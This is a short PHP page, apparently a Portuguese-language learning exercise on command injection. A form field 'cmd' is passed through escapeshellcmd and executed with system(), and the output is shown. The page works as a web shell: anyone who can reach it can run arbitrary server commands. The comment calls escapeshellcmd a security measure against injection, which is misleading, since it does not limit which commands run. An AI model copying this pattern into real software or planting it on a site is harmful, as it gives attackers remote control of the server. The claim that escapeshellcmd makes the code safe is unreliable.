<?php 
	//Ataque injection via post
	if($_SERVER["REQUEST_METHOD"] === "POST"){
		// escapeshellcmd é uma medida de segurança evitar ataque injection via post
		$cmd = escapeshellcmd($_POST["cmd"]);
		echo "<pre>";
			$comando = system($cmd, $retorno); 
		echo "</pre>";
	}
?>
<form method="post">
	<input type="text" name="cmd">
	<button type="submit"> Enviar </button>
</form>